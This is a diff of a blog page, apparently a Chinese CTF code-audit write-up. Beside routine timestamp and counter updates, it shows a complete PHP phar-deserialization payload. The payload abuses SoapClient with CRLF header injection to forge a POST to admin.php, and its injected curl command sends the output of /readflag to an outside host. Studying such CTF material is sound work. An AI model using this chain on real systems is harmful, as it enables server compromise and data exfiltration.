@@ -120,7 +120,7 @@
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/55333592-3290fb00-54ca-11e9-8816-f316ed169091.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/55333654-58b69b00-54ca-11e9-8279-d88d243c7cff.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57857218-3f22a600-7821-11e9-88a5-624bf3bb442f.png">
-<meta property="og:updated_time" content="2020-02-05T17:55:37.548Z">
+<meta property="og:updated_time" content="2020-02-09T12:39:44.721Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="代码审计 题型记录[working forever]">
 <meta name="twitter:description" content="2019高校运维赛ezpop 改 ==&amp;gt; 2020buu新年红包题第一题 源代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818">
@@ -364,8 +364,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2020-02-06T01:55:37+08:00">
-                2020-02-06
+              <time title="Post modified" itemprop="dateModified" datetime="2020-02-09T20:39:44+08:00">
+                2020-02-09
               </time>
             
           </span>
@@ -492,10 +492,14 @@
 </ul>
 <p>思路:</p>
 <ul>
-<li>传phar然后触发他, wake方法可以让我们构造任意的类</li>
-<li>构造SoapClient类去访问admin.php, 带上post数据</li>
-</ul>
+<li>
+<p>传phar然后触发他, wake方法可以让我们构造任意的类</p>
+</li>
+<li>
+<p>构造SoapClient类去访问admin.php, 带上post数据</p>
 <p>payload</p>
+</li>
+</ul>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'test.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;script language="php"&gt;__HALT_COMPILER();&lt;/script&gt;'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/admin.php"</span>;</span><br><span class="line">        $post_string = <span class="string">'admin=1&amp;cmd=curl --referer "`/readflag`" --insecure \'http://xss.buuoj.cn/index.php?do=api%26id=uHi9SZ\’&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=111'</span>. <span class="string">"\r\n"</span>;</span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name  = [</span><br><span class="line">            <span class="keyword">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                  <span class="string">'user_agent'</span>=&gt; str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>, <span class="string">'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string),</span><br><span class="line">                  <span class="string">'uri'</span>=&gt;<span class="string">'hello'</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> File;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($object));</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
 <h2 id="SWPUCTF-2018-SimplePHP">SWPUCTF 2018 SimplePHP</h2>
 <p>开局就这样</p>
@@ -996,7 +1000,7 @@ Thanks for your message Array, it has been received.</p>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-count">44</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1122,7 +1126,7 @@ Thanks for your message Array, it has been received.</p>
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">73.6k</span>
+    <span title="Site words total count">74.6k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
